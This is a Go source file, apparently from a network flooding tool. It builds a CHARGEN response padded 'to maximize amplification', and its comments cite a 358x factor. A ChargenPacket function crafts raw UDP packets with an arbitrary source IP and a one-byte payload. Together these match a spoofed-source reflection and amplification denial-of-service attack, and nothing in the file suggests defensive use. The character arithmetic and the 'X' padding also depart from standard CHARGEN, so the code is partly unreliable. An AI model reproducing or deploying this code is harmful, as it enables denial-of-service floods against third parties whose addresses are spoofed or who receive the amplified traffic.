package protocol

import (
	"bytes"
)

// CHARGENResponseBuffer generates a CHARGEN protocol response
// Amplification factor can be as high as 358x
func CHARGENResponseBuffer() []byte {
	// The CHARGEN protocol is simple, it returns a stream of ASCII characters
	var buf bytes.Buffer
	
	// The standard CHARGEN response is a cyclic stream of ASCII characters
	// The standard response is 1472 bytes (maximum UDP packet size) to achieve maximum amplification
	// Each line contains 72 characters plus a newline = 73 bytes/line
	
	// Calculate how many lines are needed to reach the maximum size
	linesNeeded := 1472 / 73  // Approximately 20 lines
	
	// Generate data in the standard CHARGEN format
	startChar := 32 // Start with ASCII space
	
	// Generate multiple lines of response
	for line := 0; line < linesNeeded; line++ {
		// The standard CHARGEN mode rotates one character per line
		currentChar := (startChar + line) % 95
		
		// Generate 72 characters per line
		for i := 0; i < 72; i++ {
			// Ensure we only use printable characters (ASCII 32-126)
			charToWrite := (currentChar + i) % 95 + 32
			buf.WriteByte(byte(charToWrite))
		}
		
		// Add a newline at the end of each line
		buf.WriteByte('\n')
	}
	
	// Fill the remaining space in the UDP packet to maximize amplification
	remainingBytes := 1472 - buf.Len()
	if remainingBytes > 0 {
		padding := bytes.Repeat([]byte{'X'}, remainingBytes)
		buf.Write(padding)
	}
	
	return buf.Bytes()
}

func ChargenPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
	return BuildUDPPacket(srcIP, dstIP, srcPort, dstPort, []byte{0x00})
}